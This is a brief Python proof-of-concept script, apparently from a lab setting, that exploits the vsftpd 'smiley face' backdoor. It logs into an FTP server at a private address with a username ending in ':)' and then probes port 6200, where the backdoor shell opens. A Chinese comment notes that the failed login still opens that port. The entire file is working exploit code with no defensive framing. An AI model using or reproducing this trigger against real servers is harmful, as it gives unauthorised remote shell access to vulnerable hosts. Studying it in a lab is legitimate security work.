import socket
from ftplib import FTP

ftp = FTP()
ip = '192.168.17.137'
user = "admin:)"
passwd = "haha"

print("start")
try:
    ftp.connect(ip,21,timeout=2)
    ftp.login(user,passwd)
    print("ftp success!")
except:
    print("There is a smiley face vulnerability.")  #登入失败（账号密码错误），但是可以利用代码打开6200端口
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
    s.connect((ip,6200))
    print("6200 success!")
    s.close()
except:
    print("6200 failed!")
